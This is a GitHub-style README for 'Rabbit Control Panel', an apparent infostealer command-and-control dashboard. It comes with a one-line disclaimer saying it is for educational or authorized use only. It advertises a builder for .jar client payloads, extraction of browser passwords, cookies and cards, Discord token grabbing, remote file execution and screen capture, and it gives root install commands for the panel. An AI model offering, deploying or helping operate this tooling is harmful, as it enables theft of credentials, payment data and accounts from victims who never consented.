# 🐇 Rabbit Control Panel

> **Rabbit Control Panel** is a full-stack, real-time remote administration & surveillance dashboard built with React, Node.js, Express, PostgreSQL, and Docker. 

---

## ⚠️ Legal Disclaimer & Warning

> [!IMPORTANT]
> **This project is strictly for educational, research, and authorized security auditing purposes.**
> - **Free & Open Source:** This project is completely free. Please stay away from scammers or individuals attempting to sell or re-brand this work as their own.
> - **Developer:** [@El_bahram](https://t.me/El_bahram)
> - **YouTube Channel:** [@orucdemiros](https://www.youtube.com/@orucdemiros)

---

## ✨ Features

- 🛠️ **Client Builder:** Live compile configured `.jar` client binaries directly from the dashboard.
- 📁 **File Manager:** Remote file system navigation, file execution, download & removal.
- 🖥️ **SysInfo Collector:** Detailed CPU, RAM, OS, GPU & network interface reporting.
- 🔑 **Browser Stealer:** Extract stored browser credentials, cookies, cards, and web history.
- 💬 **Discord Grabber:** Auto-extract active Discord session tokens.
- 📸 **Screenshot Studio:** Live screen capture & gallery system.
- 🔒 **Screen Lock & Bot Control:** Trigger custom screen lock banner or terminate bots remotely.
- 🌐 **Multi-Language Support:** Fully localized in **TR, EN, RU, ZH, AR, ES**.
- 🛡️ **Privacy / Stealth Mode:** Instant Gate Key, IP, and hostname blurring for content creators.

---

## 🚀 1-Click Automated Installation (Debian 12 / Ubuntu)

To deploy the full stack automatically on a fresh **Debian 12 (Bookworm)** or **Ubuntu** server:

```bash
git clone https://github.com/Elbahram0/rabbit-stealer-control-panel.git /var/www/bot
cd /var/www/bot
chmod +x install.sh
sudo ./install.sh
```

---

## 👤 Author & Support

- **Developer Telegram:** [@El_bahram](https://t.me/El_bahram)
- **YouTube:** [@orucdemiros](https://www.youtube.com/@orucdemiros)

---

## 📜 License

Distributed under the **MIT License**. See `LICENSE` for more information.
